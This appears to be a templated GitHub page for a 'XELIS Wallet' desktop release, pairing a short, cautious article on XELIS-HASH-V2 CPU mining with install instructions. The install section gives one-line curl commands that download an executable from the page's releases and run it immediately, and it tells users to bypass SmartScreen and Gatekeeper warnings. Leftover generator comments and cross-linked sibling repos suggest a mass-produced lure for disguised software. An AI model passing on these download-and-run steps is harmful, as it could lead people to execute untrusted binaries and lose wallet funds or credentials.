![Xelishash V2 and CPU mining for XELIS Wallet holders](assets/banner-article.png)
# Xelishash V2 and CPU mining for XELIS Wallet holders

What the algorithm is for, what a CPU can do, and where the wallet stops.

## Downloads - Mining

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Mining is not a yield product: hardware, power and luck decide the outcome, and none of that is promised here.

XELIS-HASH-V2 is the proof-of-work algorithm behind XELIS, designed to run on ordinary CPUs and GPUs rather than on specialised mining hardware. That design is why CPU mining is a real option, and the wallet's only part in it is receiving the payout.

<!-- ARTICLE-BODY-BEGIN -->
## What the algorithm is designed for

A proof-of-work algorithm decides what hardware mines efficiently. XELIS-HASH-V2 is built around commodity processors, so a normal desktop CPU or a consumer graphics card remains competitive instead of being priced out by purpose-built machines.

That is a design intent, not a guarantee about your results. It means the barrier to trying is low, not that the reward is predictable.

## What a CPU can and cannot do

A CPU can run the algorithm and submit shares to a pool. What it cannot do is make the network's difficulty smaller, so the honest expectation is a slow, steady trickle of shares rather than a jackpot.

Solo mining is the other path: you keep the whole reward when you find a block and get nothing in between. The variance is real, and it is the reason most people with one machine join a pool. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-blockdag-block-time.md">XELIS BlockDAG block production</a> explains what a solved block means in this structure.

## Mining XELIS without buying a rig

1. Get miner software that supports the algorithm, from the project's own channels rather than a random download.
2. Choose a pool, or point the miner at your own node if it supports that.
3. Paste a payout address from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> into the miner configuration.
4. Start it, watch the shares register, and leave the machine running.

Mining XELIS this way does not involve the wallet beyond that address. The wallet does not mine, does not benchmark hardware and does not need to be open while the miner runs.

## Where the wallet picks up

The payout arrives as an ordinary transaction, so the receive-side checks apply: the right address, the right network, and a synced wallet to see it. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-mining-payouts.md">XELIS Wallet mining payouts</a> covers the arrival and what to check when it is late.

For the chain you are mining and how it differs from a plain payments network, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md">what XELIS is</a> is the shorter read.

## FAQ
### What is XELIS-HASH-V2?
The proof-of-work algorithm XELIS uses. It is designed for commodity CPUs and GPUs rather than specialised mining hardware.

### Can I mine XEL with a CPU?
Yes. The algorithm is intended to keep ordinary processors competitive, though a single machine earns slowly.

### How do I mine XELIS with a CPU?
Run compatible miner software against a pool or your own node, and set a wallet address as the payout destination. The wallet itself does not mine.

### Is mining XELIS profitable?
That depends on hardware, electricity and network conditions, and no figure is published here. Treat any fixed return claim as false.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet mining payouts](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-mining-payouts.md)
- [What XELIS is](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-what-is-xelis-chain.md)
- [XELIS BlockDAG block production](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-blockdag-block-time.md)
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
